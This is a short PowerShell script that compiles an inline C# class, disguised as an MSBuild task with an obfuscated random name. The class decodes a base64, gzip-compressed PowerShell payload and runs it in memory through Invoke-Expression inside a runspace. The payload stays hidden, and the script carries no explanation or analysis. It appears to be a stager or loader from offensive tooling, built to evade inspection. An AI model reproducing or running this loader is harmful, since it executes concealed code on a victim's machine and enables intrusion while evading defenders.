$id = get-random
$code = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
namespace test
{
  public class QWEridxnaPO$id :  Task, ITask {
    public override bool Execute() {
      string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAA/21R3WvCMBB/z19xBB8stEW2N0XQ6WDChLE69iA+ZM2thrVJSK6iDP/3pa3r3Ng93Fd+l999DJSEKRRIiRNamooNciMxpGac1V7pArKTJ6wmv6J0g0f6k3quNakK05UmdMZm6A4qRz9hTIsKvRU5AqEn9skgiK3fSpVDXgrv4cWju70ZKNk+dYBGtsuyXFXWOBryusWksix5DIu9cBnS9GLTeU0m2vV1l889CQom9IpOg9IEa/ReFHhnjsPQ5xM52L9qGUNGrhmFArQPcmFJGR23hab1fRTG+Z/kYMIm10LpYdQjfgZp5Ir7Qh6NYuAPWJaGXzmjQPJdc2adPjM+Y2wuZbI5WYRWL/FdadW0Bd3RkkehizpQwCILe7HAVvpgPjC5P1oXyBsk3zY3SPuF78bjrmn+BcP147cKAgAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();";
      Runspace runspace = RunspaceFactory.CreateRunspace();
      runspace.Open();
      RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
      Pipeline pipeline = runspace.CreatePipeline();
      pipeline.Commands.AddScript(pok);
      pipeline.Invoke();
      runspace.Close();			
      return true;
    }								 
  }
}
"@

Add-Type -TypeDefinition $code -Language CSharp 
Invoke-Expression "[test.QWEridxnaPO$id]::Execute()"
